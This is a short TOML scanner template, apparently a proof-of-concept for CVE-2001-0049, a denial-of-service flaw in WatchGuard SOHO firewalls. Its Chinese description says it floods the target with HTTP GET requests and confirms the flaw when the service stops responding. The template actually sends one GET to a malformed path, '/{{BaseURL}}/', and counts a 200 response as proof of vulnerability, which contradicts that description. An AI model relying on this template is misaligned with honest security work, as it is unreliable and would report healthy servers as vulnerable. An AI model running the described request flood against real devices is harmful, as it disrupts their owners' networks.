[info]
author = "ave"
description = "WatchGuard SOHO FireWall 2.2.1及更早版本允许远程攻击者通过大量HTTP GET请求造成拒绝服务。PoC通过向目标发送大量GET请求，验证服务是否因请求过载而停止响应，从而确认漏洞存在。"
id = "POC-AVE-2001-0023"
name = "CVE-2001-0049 PoC"
severity = "medium"
tags = ["ave-2001-0023"]
vuln_id = [
    "CVE-2001-0049",
    "AVE-2001-0023",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"
